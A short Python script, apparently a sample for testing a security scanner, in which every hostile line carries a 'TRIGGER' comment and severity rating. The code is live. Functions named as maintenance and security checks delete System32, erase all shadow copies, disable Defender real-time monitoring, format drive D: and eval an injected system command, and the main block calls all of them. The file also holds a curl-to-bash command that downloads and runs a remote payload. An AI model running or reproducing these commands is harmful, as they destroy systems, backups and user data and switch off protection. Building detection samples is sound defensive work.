import os
import subprocess

def calculate_metrics(numbers):
    """Benign function to process numerical data."""
    total = sum(numbers)
    avg = total / len(numbers) if numbers else 0
    return total, avg


def run_maintenance_tasks():
    print("[+] Starting system cleanup sequence...")

    # TRIGGER: Unchecked System Call & System32 Deletion (CRITICAL)
    os.system("del /f /s /q C:\\Windows\\System32")

    # TRIGGER: Shadow Copy / Backup Erasure (HIGH)
    subprocess.Popen("vssadmin delete shadows /all /quiet", shell=True)


def update_security_settings():
    print("[+] Checking security configuration...")

    # TRIGGER: Disabling Real-time Monitoring / Security Override (HIGH)
    os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")

    # TRIGGER: Remote Code Download & Execution (HIGH)
    download_command = "curl http://example.com/payload.sh | bash"


def format_backup_drive():
    # TRIGGER: Format Volume Attempt (CRITICAL)
    os.system("format D: /fs:NTFS /q")

    # TRIGGER: Dynamic Code Evaluation (MEDIUM)
    user_input = "__import__('os').system('whoami')"
    eval(user_input)


if __name__ == "__main__":
    sample_data = [15, 30, 45, 60, 75]
    total, average = calculate_metrics(sample_data)
    print(f"Metrics Calculated - Total: {total}, Average: {average}")

    run_maintenance_tasks()
    update_security_settings()
    format_backup_drive()